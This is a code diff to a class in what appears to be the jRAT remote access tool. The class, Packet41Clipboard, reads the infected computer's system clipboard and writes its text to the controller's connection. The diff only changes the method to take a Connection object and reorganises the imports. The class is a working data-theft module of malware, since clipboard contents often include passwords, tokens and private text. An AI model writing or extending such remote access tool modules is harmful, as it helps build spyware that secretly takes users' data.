@@ -1,16 +1,16 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.awt.Toolkit;
+import jrat.client.Connection;
+
+import java.awt.*;
 import java.awt.datatransfer.DataFlavor;
-import java.io.DataOutputStream;
 
 
 public class Packet41Clipboard extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine((String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
+	public void write(Connection con) throws Exception {
+		con.writeLine((String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
 	}
 
 	@Override
